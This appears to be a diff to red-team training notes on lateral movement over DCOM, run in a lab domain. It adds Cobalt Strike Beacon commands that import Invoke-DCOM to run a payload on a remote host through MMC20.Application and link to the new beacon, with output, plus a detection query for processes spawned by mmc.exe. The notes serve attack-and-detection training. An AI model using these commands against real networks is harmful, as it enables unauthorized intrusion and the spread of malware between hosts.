@@ -286,4 +286,25 @@ A proprietary Microsoft technology used for communication between software compo
 
 ### Beacon Usage w/ DCOM
 
-Beacon has no built-in capabilities
+Beacon has no built-in capabilities to interact over Distributed Component Object Model (DCOM), so we much use an external command such as [<mark style="color:yellow;">`Invoke-DCOM`</mark>](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1).
+
+Later, we'll see how this can be integrated within the <mark style="color:yellow;">`jump`</mark> command.
+
+```
+beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
+beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
+Completed
+
+beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
+[+] established link to child beacon: 10.10.122.30
+```
+
+**DCOM is more complicated to detect, since each "Method" works in a different way. In the particular case of&#x20;**<mark style="color:yellow;">**`MMC20.Application`**</mark>**, the spawned process will be a child of&#x20;**<mark style="color:yellow;">**`mmc.exe`**</mark>**:**
+
+```
+event.category: process and event.type : start and process.parent.name: mmc.exe
+```
+
+<figure><img src="../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>
+
+Processes started via DCOM may also be observed where the parent is <mark style="color:yellow;">`svchost.exe`</mark> with command line arguments of <mark style="color:yellow;">`-k DcomLaunch`</mark>.
